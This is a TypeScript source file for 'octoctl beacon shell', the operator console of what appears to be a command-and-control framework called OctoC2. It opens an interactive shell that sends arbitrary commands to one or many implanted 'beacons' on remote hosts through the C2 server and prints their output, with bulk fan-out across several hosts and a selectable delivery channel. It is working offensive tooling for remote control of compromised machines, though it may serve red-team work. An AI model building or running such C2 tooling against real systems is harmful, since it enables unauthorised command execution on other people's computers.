/**
 * octoctl beacon shell
 *
 * Interactive shell session over the C2 server HTTP API.
 * Queues `shell` tasks and polls for results in a REPL loop.
 *
 * Usage:
 *   OCTOC2_SERVER_URL=http://localhost:8080 octoctl beacon shell --beacon <id>
 *   OCTOC2_SERVER_URL=http://localhost:8080 octoctl beacon shell --beacon <id> --tentacle notes
 *   OCTOC2_SERVER_URL=http://localhost:8080 octoctl beacon shell --beacon <id> --bulk <id2>,<id3>
 */

import * as readline from "node:readline";
import { readFile, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { join } from "node:path";

// ── Types ──────────────────────────────────────────────────────────────────────

export interface BeaconShellOptions {
  beacon:               string;          // primary beacon ID prefix
  bulk?:                string[] | undefined;  // additional beacon IDs for fan-out
  tentacle?:            string | undefined;  // force delivery via specific channel
  serverUrl?:           string | undefined;  // overrides OCTOC2_SERVER_URL
  timeout?:             number | undefined;  // seconds to wait per command (default: 300)
}

interface ServerBeacon {
  id:       string;
  hostname: string;
  [k: string]: unknown;
}

interface TaskResult {
  taskId:      string;
  beaconId:    string;
  kind?:       string;
  status:      "completed" | "pending" | "delivered" | "failed";
  result:      { output?: string; success?: boolean } | string | null;
  completedAt: string | null;
}

// ── Pure helpers (exported for testing) ───────────────────────────────────────

/**
 * Extract the printable output string from a task result payload.
 * The result field may be:
 *   - null / undefined           → empty string
 *   - a plain string             → returned as-is
 *   - { output: "..." }          → output field
 *   - { success: false }         → empty string (no output)
 */
export function extractOutput(result: TaskResult["result"]): string {
  if (result === null || result === undefined) return "";
  if (typeof result === "string") return result;
  if (typeof result === "object" && "output" in result) {
    return String(result.output ?? "");
  }
  return "";
}

/**
 * Return true when the line should terminate the REPL.
 * Matches: exit, quit, .exit — case-insensitive.
 */
export function isExitCommand(line: string): boolean {
  const trimmed = line.trim().toLowerCase();
  return trimmed === "exit" || trimmed === "quit" || trimmed === ".exit";
}

/** Default path for persisted shell history. */
export function buildHistoryPath(): string {
  return join(homedir(), ".svc_shell_history");
}

/**
 * Load history lines from a file.
 * Returns empty array if file does not exist or cannot be read.
 */
export async function loadHistory(filePath: string): Promise<string[]> {
  try {
    const content = await readFile(filePath, "utf-8");
    return content.split("\n").filter(l => l.trim().length > 0);
  } catch {
    return [];
  }
}

/**
 * Persist history lines to a file.
 * Caps to the last MAX_HISTORY entries to prevent unbounded growth.
 */
export async function saveHistory(lines: string[], filePath: string): Promise<void> {
  const MAX_HISTORY = 500;
  const toSave = lines.slice(-MAX_HISTORY);
  try {
    await writeFile(filePath, toSave.join("\n") + "\n");
  } catch {
    // Best-effort — ignore write failures (read-only FS, permissions, etc.)
  }
}

/**
 * Format output from a single beacon in a bulk fan-out session.
 * Each line is prefixed with [hostname|shortId].
 */
export function formatBulkOutput(beaconId: string, hostname: string, output: string): string {
  const shortId = beaconId.slice(0, 8);
  const prefix  = `[${hostname}|${shortId}]`;
  if (!output.trim()) return `${prefix} (no output)`;
  return output.split("\n").map(l => `${prefix} ${l}`).join("\n");
}

// ── Server helpers ─────────────────────────────────────────────────────────────

async function fetchBeacon(
  serverUrl: string,
  beaconPrefix: string,
  token: string,
): Promise<ServerBeacon> {
  const resp = await fetch(`${serverUrl}/api/beacons`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!resp.ok) {
    throw new Error(`GET /api/beacons returned ${resp.status}`);
  }
  const beacons = (await resp.json()) as ServerBeacon[];
  const beacon  = beacons.find(b => b.id === beaconPrefix || b.id.startsWith(beaconPrefix));
  if (!beacon) {
    throw new Error(`Beacon '${beaconPrefix}' not found on server`);
  }
  return beacon;
}

async function postTask(
  serverUrl: string,
  beaconId: string,
  token: string,
  cmd: string,
  preferredChannel?: string,
): Promise<string> {
  const body: Record<string, unknown> = {
    kind: "shell",
    args: { cmd },
    ...(preferredChannel !== undefined && { preferredChannel }),
  };

  const resp = await fetch(`${serverUrl}/api/beacon/${beaconId}/task`, {
    method:  "POST",
    headers: {
      Authorization:  `Bearer ${token}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });

  if (!resp.ok) {
    const text = await resp.text();
    throw new Error(`POST /api/beacon/${beaconId}/task returned ${resp.status}: ${text}`);
  }

  const data = (await resp.json()) as { taskId?: string; id?: string };
  const taskId = data.taskId ?? data.id;
  if (!taskId) {
    throw new Error("Server did not return a taskId");
  }
  return taskId;
}

async function pollForResult(
  serverUrl: string,
  beaconId: string,
  token: string,
  taskId: string,
  timeoutMs: number,
): Promise<TaskResult | null> {
  const deadline = Date.now() + timeoutMs;

  while (Date.now() < deadline) {
    await new Promise<void>(resolve => setTimeout(resolve, 3000));

    const resp = await fetch(`${serverUrl}/api/beacon/${beaconId}/results`, {
      headers: { Authorization: `Bearer ${token}` },
    });

    if (!resp.ok) {
      // Non-fatal poll failure — keep trying
      continue;
    }

    const results = (await resp.json()) as TaskResult[];
    const match   = results.find(r => r.taskId === taskId && r.status === "completed");
    if (match) return match;
  }

  return null; // timed out
}

// ── ANSI helpers ───────────────────────────────────────────────────────────────

const BOLD  = "\x1b[1m";
const DIM   = "\x1b[2m";
const RESET = "\x1b[0m";
const GREEN = "\x1b[32m";
const RED   = "\x1b[31m";
const CYAN  = "\x1b[36m";

// ── Main entrypoint ────────────────────────────────────────────────────────────

export async function runBeaconShell(opts: BeaconShellOptions): Promise<void> {
  const serverUrl = opts.serverUrl ?? process.env["OCTOC2_SERVER_URL"] ?? "";
  if (!serverUrl) {
    console.error(
      "\n  Error: --server-url or OCTOC2_SERVER_URL env var is required for beacon shell.\n"
    );
    process.exit(1);
  }

  const token      = process.env["OCTOC2_DASHBOARD_TOKEN"] ?? "dev-token";
  const timeoutSec = opts.timeout ?? 300;
  const timeoutMs  = timeoutSec * 1000;

  // Resolve primary beacon from server
  let beacon: ServerBeacon;
  try {
    beacon = await fetchBeacon(serverUrl, opts.beacon, token);
  } catch (err) {
    console.error(`\n  Error: ${(err as Error).message}\n`);
    process.exit(1);
  }

  // Resolve bulk beacons (fan-out targets), silently skip failures
  const bulkBeacons: ServerBeacon[] = [];
  if (opts.bulk && opts.bulk.length > 0) {
    for (const id of opts.bulk) {
      try {
        const b = await fetchBeacon(serverUrl, id, token);
        if (b.id !== beacon.id) bulkBeacons.push(b);
      } catch {
        // Beacon not found — skip; operator will see missing output
      }
    }
  }

  const allBeacons: ServerBeacon[] = [beacon, ...bulkBeacons];
  const isBulk = allBeacons.length > 1;

  const hostname = String(beacon.hostname ?? beacon.id);
  const prompt   = isBulk
    ? `shell [bulk×${allBeacons.length}]> `
    : `shell [${hostname}]> `;

  // Load persisted history
  const historyPath  = buildHistoryPath();
  const savedHistory = await loadHistory(historyPath);
  const sessionLines: string[] = [];

  console.log("");
  console.log(
    `  ${BOLD}Operator Shell${RESET} — ${DIM}${hostname}${RESET}  ` +
    `${DIM}(${beacon.id.slice(0, 8)}…)${RESET}`
  );
  console.log(`  ${DIM}Server:${RESET} ${serverUrl}`);
  if (opts.tentacle) {
    console.log(`  ${DIM}Channel:${RESET} ${opts.tentacle}`);
  }
  if (isBulk) {
    const ids = allBeacons.map(b => `${String(b.hostname ?? b.id)} (${b.id.slice(0, 8)}…)`).join(", ");
    console.log(`  ${DIM}Bulk targets:${RESET} ${ids}`);
  }
  console.log(`  ${DIM}Type 'exit' or press Ctrl+C to quit.${RESET}`);
  console.log("");

  const rl = readline.createInterface({
    input:       process.stdin,
    output:      process.stdout,
    terminal:    true,
    prompt,
    historySize: 500,
  });

  // Pre-populate readline history from saved file (readline stores newest-first)
  const rlWithHistory = rl as unknown as { history: string[] };
  if (savedHistory.length > 0) {
    rlWithHistory.history = [...savedHistory].reverse();
  }

  // Ctrl+C handler — save history and exit cleanly
  rl.on("SIGINT", async () => {
    process.stdout.write("\n");
    rl.close();
    await saveHistory([...savedHistory, ...sessionLines], historyPath);
    process.exit(0);
  });

  rl.prompt();

  for await (const line of rl) {
    const trimmed = line.trim();

    // Empty line — re-prompt
    if (trimmed === "") {
      rl.prompt();
      continue;
    }

    // Track session history (skip exit commands)
    if (!isExitCommand(trimmed)) {
      sessionLines.push(trimmed);
    }

    // Exit commands
    if (isExitCommand(trimmed)) {
      console.log(`  ${DIM}Goodbye.${RESET}`);
      rl.close();
      break;
    }

    if (isBulk) {
      // Fan-out: queue + poll all beacons in parallel
      console.log(
        `  ${DIM}Queueing on ${allBeacons.length} beacons. Waiting (max ${timeoutSec}s)…${RESET}`
      );

      const fanResults = await Promise.all(
        allBeacons.map(async (b) => {
          try {
            const taskId = await postTask(serverUrl, b.id, token, trimmed, opts.tentacle);
            const result = await pollForResult(serverUrl, b.id, token, taskId, timeoutMs);
            return { beacon: b, result, error: null as string | null };
          } catch (err) {
            return { beacon: b, result: null, error: (err as Error).message };
          }
        })
      );

      for (const { beacon: b, result, error } of fanResults) {
        const bHostname = String(b.hostname ?? b.id);
        if (error) {
          console.log(`  ${RED}${formatBulkOutput(b.id, bHostname, `Error: ${error}`)}${RESET}`);
        } else if (result === null) {
          console.log(`  ${RED}${formatBulkOutput(b.id, bHostname, `[timeout after ${timeoutSec}s]`)}${RESET}`);
        } else {
          const output = extractOutput(result.result);
          console.log(`${CYAN}${formatBulkOutput(b.id, bHostname, output)}${RESET}`);
        }
      }
    } else {
      // Single beacon mode
      let taskId: string;
      try {
        taskId = await postTask(serverUrl, beacon.id, token, trimmed, opts.tentacle);
      } catch (err) {
        console.error(`  ${RED}Error queuing task:${RESET} ${(err as Error).message}`);
        rl.prompt();
        continue;
      }

      console.log(
        `  ${DIM}Task ${taskId.slice(0, 8)}… queued. Waiting for result (max ${timeoutSec}s)…${RESET}`
      );

      const result = await pollForResult(serverUrl, beacon.id, token, taskId, timeoutMs);

      if (result === null) {
        console.log(`  ${RED}[timeout after ${timeoutSec}s]${RESET}`);
      } else {
        const output = extractOutput(result.result);
        if (output.trim().length > 0) {
          console.log(`${CYAN}`);
          for (const outputLine of output.split("\n")) {
            console.log(`    ${outputLine}`);
          }
          process.stdout.write(RESET);
        } else {
          console.log(`  ${GREEN}(no output)${RESET}`);
        }
      }
    }

    rl.prompt();
  }

  // Save history on clean exit
  await saveHistory([...savedHistory, ...sessionLines], historyPath);
}
